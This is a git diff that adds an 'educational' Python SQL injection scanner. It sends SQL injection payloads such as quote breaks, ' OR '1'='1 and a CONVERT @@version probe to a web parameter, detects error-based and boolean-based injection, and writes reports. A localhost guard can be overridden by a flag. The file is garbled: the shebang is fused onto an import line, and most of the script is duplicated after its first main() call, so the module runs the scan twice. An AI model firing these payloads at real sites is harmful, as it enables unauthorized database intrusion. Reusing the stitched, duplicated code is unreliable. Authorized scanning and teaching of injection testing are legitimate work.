@@ -1,0 +1,523 @@
+import argparse
+import concurrent.futures
+import json
+import re
+import sys#!/usr/bin/env python3
+"""
+SQL Injection Scanner
+======================
+Educational security-testing tool built for the Syntecxhub Cybersecurity
+Internship (Project 1).
+
+WHAT IT DOES
+------------
+- Sends baseline + crafted requests to a target URL/parameter.
+- Looks for common SQL error signatures (error-based detection).
+- Performs a simple boolean-based blind SQLi test (TRUE vs FALSE payload
+  comparison on response length/content).
+- Logs every finding with timestamp to a JSON + human-readable report.
+- Uses a thread pool for concurrency and a token-bucket style delay for
+  basic rate-limiting so the scanner doesn't hammer the target.
+
+LEGAL / ETHICAL USE ONLY
+------------------------
+This tool must ONLY be pointed at systems you own or are explicitly
+authorized to test, such as a local DVWA (Damn Vulnerable Web Application)
+instance or another intentionally vulnerable practice app running on your
+own machine/network. By default the script refuses to run against any
+host that isn't localhost/127.0.0.1 unless you pass --i-have-permission
+to confirm you have explicit written authorization to test the target.
+
+Example (against a local DVWA instance):
+
+    python3 sql_injection_scanner.py \\
+        --url "http://127.0.0.1/dvwa/vulnerabilities/sqli/" \\
+        --param id \\
+        --method GET \\
+        --cookie "PHPSESSID=xxxx; security=low" \\
+        --extra-params "Submit=Submit"
+
+"""
+
+import argparse
+import concurrent.futures
+import json
+import re
+import sys
+import time
+from datetime import datetime, timezone
+from urllib.parse import urlparse, parse_qsl, urlencode
+
+import requests
+
+# --------------------------------------------------------------------------
+# Payloads & detection signatures
+# --------------------------------------------------------------------------
+
+ERROR_PAYLOADS = [
+    "'",
+    "''",
+    "\"",
+    "' OR '1'='1",
+    "' OR '1'='1' -- -",
+    "' OR 1=1 -- -",
+    "' AND 1=CONVERT(int, (SELECT @@version)) -- -",
+    "1' ORDER BY 10000 -- -",
+    "1) OR (1=1",
+]
+
+BOOLEAN_TRUE_PAYLOAD = "1' OR '1'='1"
+BOOLEAN_FALSE_PAYLOAD = "1' OR '1'='2"
+
+# Common DB error fingerprints (kept short/generic, not a copyrighted list)
+DB_ERROR_SIGNATURES = [
+    r"sql syntax.*mysql",
+    r"warning.*mysql_",
+    r"unclosed quotation mark",
+    r"quoted string not properly terminated",
+    r"microsoft ole db provider for sql server",
+    r"pg_query\(\)",
+    r"postgresql.*error",
+    r"ora-\d{5}",
+    r"sqlite3.OperationalError",
+    r"sqlstate\[",
+    r"you have an error in your sql syntax",
+]
+
+COMPILED_SIGNATURES = [re.compile(sig, re.IGNORECASE) for sig in DB_ERROR_SIGNATURES]
+
+
+# --------------------------------------------------------------------------
+# Rate limiter
+# --------------------------------------------------------------------------
+
+class RateLimiter:
+    """Simple delay-based rate limiter shared across threads."""
+
+    def __init__(self, requests_per_second: float):
+        self.min_interval = 1.0 / requests_per_second if requests_per_second > 0 else 0
+        self._last_call = 0.0
+
+    def wait(self):
+        if self.min_interval <= 0:
+            return
+        now = time.monotonic()
+        elapsed = now - self._last_call
+        sleep_for = self.min_interval - elapsed
+        if sleep_for > 0:
+            time.sleep(sleep_for)
+        self._last_call = time.monotonic()
+
+
+# --------------------------------------------------------------------------
+# Core scanner
+# --------------------------------------------------------------------------
+
+class SQLInjectionScanner:
+    def __init__(self, base_url, param, method="GET", extra_params=None,
+                 cookie=None, timeout=10, rate_limiter=None, session=None):
+        self.base_url = base_url
+        self.param = param
+        self.method = method.upper()
+        self.extra_params = extra_params or {}
+        self.headers = {"Cookie": cookie} if cookie else {}
+        self.timeout = timeout
+        self.rate_limiter = rate_limiter or RateLimiter(5)
+        self.session = session or requests.Session()
+
+    def _send(self, value):
+        params = dict(self.extra_params)
+        params[self.param] = value
+        self.rate_limiter.wait()
+        if self.method == "GET":
+            resp = self.session.get(self.base_url, params=params,
+                                     headers=self.headers, timeout=self.timeout)
+        else:
+            resp = self.session.post(self.base_url, data=params,
+                                      headers=self.headers, timeout=self.timeout)
+        return resp
+
+    def test_error_based(self, payload):
+        try:
+            resp = self._send(payload)
+        except requests.RequestException as exc:
+            return {"payload": payload, "error": str(exc), "vulnerable": False}
+
+        matched = [sig.pattern for sig in COMPILED_SIGNATURES if sig.search(resp.text)]
+        return {
+            "type": "error-based",
+            "payload": payload,
+            "status_code": resp.status_code,
+            "response_length": len(resp.text),
+            "matched_signatures": matched,
+            "vulnerable": bool(matched),
+        }
+
+    def test_boolean_based(self):
+        try:
+            true_resp = self._send(BOOLEAN_TRUE_PAYLOAD)
+            false_resp = self._send(BOOLEAN_FALSE_PAYLOAD)
+        except requests.RequestException as exc:
+            return {"type": "boolean-based", "error": str(exc), "vulnerable": False}
+
+        length_diff = abs(len(true_resp.text) - len(false_resp.text))
+        vulnerable = true_resp.text != false_resp.text and length_diff > 0
+
+        return {
+            "type": "boolean-based",
+            "true_payload": BOOLEAN_TRUE_PAYLOAD,
+            "false_payload": BOOLEAN_FALSE_PAYLOAD,
+            "true_response_length": len(true_resp.text),
+            "false_response_length": len(false_resp.text),
+            "length_diff": length_diff,
+            "vulnerable": vulnerable,
+        }
+
+    def run(self, max_workers=4):
+        results = []
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as pool:
+            futures = [pool.submit(self.test_error_based, p) for p in ERROR_PAYLOADS]
+            for fut in concurrent.futures.as_completed(futures):
+                results.append(fut.result())
+
+        results.append(self.test_boolean_based())
+        return results
+
+
+# --------------------------------------------------------------------------
+# Reporting
+# --------------------------------------------------------------------------
+
+def write_report(results, target, param, json_path="sqli_report.json",
+                  text_path="sqli_report.txt"):
+    timestamp = datetime.now(timezone.utc).isoformat()
+    report = {
+        "scan_time_utc": timestamp,
+        "target": target,
+        "parameter": param,
+        "results": results,
+    }
+
+    with open(json_path, "w") as f:
+        json.dump(report, f, indent=2)
+
+    vulnerable_findings = [r for r in results if r.get("vulnerable")]
+    with open(text_path, "w") as f:
+        f.write(f"SQL Injection Scan Report\n")
+        f.write(f"Scanned at (UTC): {timestamp}\n")
+        f.write(f"Target: {target}\n")
+        f.write(f"Parameter: {param}\n")
+        f.write(f"Total tests run: {len(results)}\n")
+        f.write(f"Potential vulnerabilities found: {len(vulnerable_findings)}\n\n")
+
+        for r in results:
+            f.write("-" * 60 + "\n")
+            for k, v in r.items():
+                f.write(f"{k}: {v}\n")
+            f.write("\n")
+
+    return json_path, text_path
+
+
+# --------------------------------------------------------------------------
+# Safety check
+# --------------------------------------------------------------------------
+
+def is_authorized_target(url, force):
+    if force:
+        return True
+    host = urlparse(url).hostname or ""
+    return host in ("localhost", "127.0.0.1", "::1")
+
+
+# --------------------------------------------------------------------------
+# CLI
+# --------------------------------------------------------------------------
+
+def parse_extra_params(raw):
+    if not raw:
+        return {}
+    return dict(parse_qsl(raw))
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Educational SQL Injection Scanner")
+    parser.add_argument("--url", required=True, help="Target URL to test")
+    parser.add_argument("--param", required=True, help="Parameter name to inject into")
+    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
+    parser.add_argument("--extra-params", default="",
+                         help="Additional static params, e.g. 'Submit=Submit&foo=bar'")
+    parser.add_argument("--cookie", default=None, help="Cookie header value, e.g. session cookies")
+    parser.add_argument("--rps", type=float, default=5.0, help="Max requests per second")
+    parser.add_argument("--workers", type=int, default=4, help="Concurrent worker threads")
+    parser.add_argument("--i-have-permission", action="store_true",
+                         help="Confirm you have explicit authorization to test a non-local target")
+    args = parser.parse_args()
+
+    if not is_authorized_target(args.url, args.i_have_permission):
+        print("Refusing to scan a non-local target without --i-have-permission.")
+        print("Only test systems you own or are explicitly authorized to test.")
+        sys.exit(1)
+
+    limiter = RateLimiter(args.rps)
+    scanner = SQLInjectionScanner(
+        base_url=args.url,
+        param=args.param,
+        method=args.method,
+        extra_params=parse_extra_params(args.extra_params),
+        cookie=args.cookie,
+        rate_limiter=limiter,
+    )
+
+    print(f"Scanning {args.url} (param={args.param}) ...")
+    results = scanner.run(max_workers=args.workers)
+
+    json_path, text_path = write_report(results, args.url, args.param)
+    vulnerable = [r for r in results if r.get("vulnerable")]
+
+    print(f"\nDone. {len(vulnerable)} potential issue(s) found out of {len(results)} tests.")
+    print(f"JSON report: {json_path}")
+    print(f"Text report: {text_path}")
+
+
+if __name__ == "__main__":
+    main()
+
+import time
+from datetime import datetime, timezone
+from urllib.parse import urlparse, parse_qsl, urlencode
+
+import requests
+
+# --------------------------------------------------------------------------
+# Payloads & detection signatures
+# --------------------------------------------------------------------------
+
+ERROR_PAYLOADS = [
+    "'",
+    "''",
+    "\"",
+    "' OR '1'='1",
+    "' OR '1'='1' -- -",
+    "' OR 1=1 -- -",
+    "' AND 1=CONVERT(int, (SELECT @@version)) -- -",
+    "1' ORDER BY 10000 -- -",
+    "1) OR (1=1",
+]
+
+BOOLEAN_TRUE_PAYLOAD = "1' OR '1'='1"
+BOOLEAN_FALSE_PAYLOAD = "1' OR '1'='2"
+
+# Common DB error fingerprints (kept short/generic, not a copyrighted list)
+DB_ERROR_SIGNATURES = [
+    r"sql syntax.*mysql",
+    r"warning.*mysql_",
+    r"unclosed quotation mark",
+    r"quoted string not properly terminated",
+    r"microsoft ole db provider for sql server",
+    r"pg_query\(\)",
+    r"postgresql.*error",
+    r"ora-\d{5}",
+    r"sqlite3.OperationalError",
+    r"sqlstate\[",
+    r"you have an error in your sql syntax",
+]
+
+COMPILED_SIGNATURES = [re.compile(sig, re.IGNORECASE) for sig in DB_ERROR_SIGNATURES]
+
+
+# --------------------------------------------------------------------------
+# Rate limiter
+# --------------------------------------------------------------------------
+
+class RateLimiter:
+    """Simple delay-based rate limiter shared across threads."""
+
+    def __init__(self, requests_per_second: float):
+        self.min_interval = 1.0 / requests_per_second if requests_per_second > 0 else 0
+        self._last_call = 0.0
+
+    def wait(self):
+        if self.min_interval <= 0:
+            return
+        now = time.monotonic()
+        elapsed = now - self._last_call
+        sleep_for = self.min_interval - elapsed
+        if sleep_for > 0:
+            time.sleep(sleep_for)
+        self._last_call = time.monotonic()
+
+
+# --------------------------------------------------------------------------
+# Core scanner
+# --------------------------------------------------------------------------
+
+class SQLInjectionScanner:
+    def __init__(self, base_url, param, method="GET", extra_params=None,
+                 cookie=None, timeout=10, rate_limiter=None, session=None):
+        self.base_url = base_url
+        self.param = param
+        self.method = method.upper()
+        self.extra_params = extra_params or {}
+        self.headers = {"Cookie": cookie} if cookie else {}
+        self.timeout = timeout
+        self.rate_limiter = rate_limiter or RateLimiter(5)
+        self.session = session or requests.Session()
+
+    def _send(self, value):
+        params = dict(self.extra_params)
+        params[self.param] = value
+        self.rate_limiter.wait()
+        if self.method == "GET":
+            resp = self.session.get(self.base_url, params=params,
+                                     headers=self.headers, timeout=self.timeout)
+        else:
+            resp = self.session.post(self.base_url, data=params,
+                                      headers=self.headers, timeout=self.timeout)
+        return resp
+
+    def test_error_based(self, payload):
+        try:
+            resp = self._send(payload)
+        except requests.RequestException as exc:
+            return {"payload": payload, "error": str(exc), "vulnerable": False}
+
+        matched = [sig.pattern for sig in COMPILED_SIGNATURES if sig.search(resp.text)]
+        return {
+            "type": "error-based",
+            "payload": payload,
+            "status_code": resp.status_code,
+            "response_length": len(resp.text),
+            "matched_signatures": matched,
+            "vulnerable": bool(matched),
+        }
+
+    def test_boolean_based(self):
+        try:
+            true_resp = self._send(BOOLEAN_TRUE_PAYLOAD)
+            false_resp = self._send(BOOLEAN_FALSE_PAYLOAD)
+        except requests.RequestException as exc:
+            return {"type": "boolean-based", "error": str(exc), "vulnerable": False}
+
+        length_diff = abs(len(true_resp.text) - len(false_resp.text))
+        vulnerable = true_resp.text != false_resp.text and length_diff > 0
+
+        return {
+            "type": "boolean-based",
+            "true_payload": BOOLEAN_TRUE_PAYLOAD,
+            "false_payload": BOOLEAN_FALSE_PAYLOAD,
+            "true_response_length": len(true_resp.text),
+            "false_response_length": len(false_resp.text),
+            "length_diff": length_diff,
+            "vulnerable": vulnerable,
+        }
+
+    def run(self, max_workers=4):
+        results = []
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as pool:
+            futures = [pool.submit(self.test_error_based, p) for p in ERROR_PAYLOADS]
+            for fut in concurrent.futures.as_completed(futures):
+                results.append(fut.result())
+
+        results.append(self.test_boolean_based())
+        return results
+
+
+# --------------------------------------------------------------------------
+# Reporting
+# --------------------------------------------------------------------------
+
+def write_report(results, target, param, json_path="sqli_report.json",
+                  text_path="sqli_report.txt"):
+    timestamp = datetime.now(timezone.utc).isoformat()
+    report = {
+        "scan_time_utc": timestamp,
+        "target": target,
+        "parameter": param,
+        "results": results,
+    }
+
+    with open(json_path, "w") as f:
+        json.dump(report, f, indent=2)
+
+    vulnerable_findings = [r for r in results if r.get("vulnerable")]
+    with open(text_path, "w") as f:
+        f.write(f"SQL Injection Scan Report\n")
+        f.write(f"Scanned at (UTC): {timestamp}\n")
+        f.write(f"Target: {target}\n")
+        f.write(f"Parameter: {param}\n")
+        f.write(f"Total tests run: {len(results)}\n")
+        f.write(f"Potential vulnerabilities found: {len(vulnerable_findings)}\n\n")
+
+        for r in results:
+            f.write("-" * 60 + "\n")
+            for k, v in r.items():
+                f.write(f"{k}: {v}\n")
+            f.write("\n")
+
+    return json_path, text_path
+
+
+# --------------------------------------------------------------------------
+# Safety check
+# --------------------------------------------------------------------------
+
+def is_authorized_target(url, force):
+    if force:
+        return True
+    host = urlparse(url).hostname or ""
+    return host in ("localhost", "127.0.0.1", "::1")
+
+
+# --------------------------------------------------------------------------
+# CLI
+# --------------------------------------------------------------------------
+
+def parse_extra_params(raw):
+    if not raw:
+        return {}
+    return dict(parse_qsl(raw))
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Educational SQL Injection Scanner")
+    parser.add_argument("--url", required=True, help="Target URL to test")
+    parser.add_argument("--param", required=True, help="Parameter name to inject into")
+    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
+    parser.add_argument("--extra-params", default="",
+                         help="Additional static params, e.g. 'Submit=Submit&foo=bar'")
+    parser.add_argument("--cookie", default=None, help="Cookie header value, e.g. session cookies")
+    parser.add_argument("--rps", type=float, default=5.0, help="Max requests per second")
+    parser.add_argument("--workers", type=int, default=4, help="Concurrent worker threads")
+    parser.add_argument("--i-have-permission", action="store_true",
+                         help="Confirm you have explicit authorization to test a non-local target")
+    args = parser.parse_args()
+
+    if not is_authorized_target(args.url, args.i_have_permission):
+        print("Refusing to scan a non-local target without --i-have-permission.")
+        print("Only test systems you own or are explicitly authorized to test.")
+        sys.exit(1)
+
+    limiter = RateLimiter(args.rps)
+    scanner = SQLInjectionScanner(
+        base_url=args.url,
+        param=args.param,
+        method=args.method,
+        extra_params=parse_extra_params(args.extra_params),
+        cookie=args.cookie,
+        rate_limiter=limiter,
+    )
+
+    print(f"Scanning {args.url} (param={args.param}) ...")
+    results = scanner.run(max_workers=args.workers)
+
+    json_path, text_path = write_report(results, args.url, args.param)
+    vulnerable = [r for r in results if r.get("vulnerable")]
+
+    print(f"\nDone. {len(vulnerable)} potential issue(s) found out of {len(results)} tests.")
+    print(f"JSON report: {json_path}")
+    print(f"Text report: {text_path}")
+
+
+if __name__ == "__main__":
+    main()
